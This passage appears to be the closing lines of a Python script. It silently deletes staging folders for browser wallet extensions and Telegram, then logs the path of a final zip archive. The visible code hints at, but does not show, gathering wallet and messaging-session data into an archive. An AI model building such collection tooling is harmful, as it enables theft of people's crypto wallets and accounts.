    if ext_wallet_dir.exists():  shutil.rmtree(ext_wallet_dir,  ignore_errors=True)
    if telegram_dir and telegram_dir.exists():
        shutil.rmtree(telegram_dir, ignore_errors=True)

    log.info(f"Done: {final_zip}")

if __name__ == "__main__":
    main()
